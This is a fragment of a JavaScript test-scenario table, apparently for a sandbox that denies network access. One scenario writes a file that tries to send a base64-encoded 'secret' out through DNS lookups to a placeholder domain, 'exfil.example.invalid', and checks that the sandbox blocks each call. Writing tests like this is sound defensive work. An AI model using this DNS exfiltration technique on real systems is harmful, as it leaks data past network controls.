...
const SCENARIOS = {
  ...
  dns: () => ({ ...CODE, arquivos: [{ caminho: 'soma.js', conteudo: "let n = 0;\nfor (const f of [() => require('dns').resolveTxt('c2VncmVkbw.exfil.example.invalid', () => {}), () => require('dns').lookup('c2VncmVkbw.exfil.example.invalid', () => {}), () => require('dns').promises.lookup('c2VncmVkbw.exfil.example.invalid').catch(() => {})]) {\n  try { f(); } catch (e) { if (e.code === 'ERR_MINHAIA_NETWORK_DENIED') n += 1; }\n}\nconsole.log('DNS_NEGADOS=' + n);\nif (n === 2) throw Object.assign(new Error('ERR_MINHAIA_NETWORK_DENIED: resolveTxt e lookup negados'), { code: 'ERR_MINHAIA_NETWORK_DENIED' });\nconsole.log(5);\n" }] }),
